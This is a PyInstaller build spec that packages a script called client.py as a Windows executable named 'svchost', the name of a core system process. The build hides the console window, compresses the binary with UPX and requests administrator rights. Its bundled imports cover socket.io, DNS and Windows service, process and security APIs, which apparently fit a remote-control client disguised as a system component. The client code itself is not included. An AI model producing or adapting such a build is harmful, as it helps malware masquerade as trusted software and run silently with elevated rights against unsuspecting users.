# -*- mode: python ; coding: utf-8 -*-
"""
Simplified PyInstaller spec file for compiling client.py to svchost.exe
- Silent execution (no console window)
- All dependencies bundled
- Optimized for Windows deployment with Python 3.13
"""

block_cipher = None

# Essential hidden imports only
hiddenimports = [
    'engineio.async_drivers.threading',
    'dns',
    'dns.resolver',
    'win32timezone',
    'pywintypes',
    'pythoncom',
    'win32api',
    'win32con',
    'win32file',
    'win32gui',
    'win32process',
    'win32security',
    'win32service',
    'win32com.client',
    'comtypes.client',
]

a = Analysis(
    ['client.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'pandas',
        'scipy',
        'PyQt5',
        'PyQt6',
        'tkinter',
        'test',
        'unittest',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='svchost',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # NO CONSOLE WINDOW - Silent execution
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
    uac_admin=True,  # Request admin privileges properly
    uac_uiaccess=False,
)
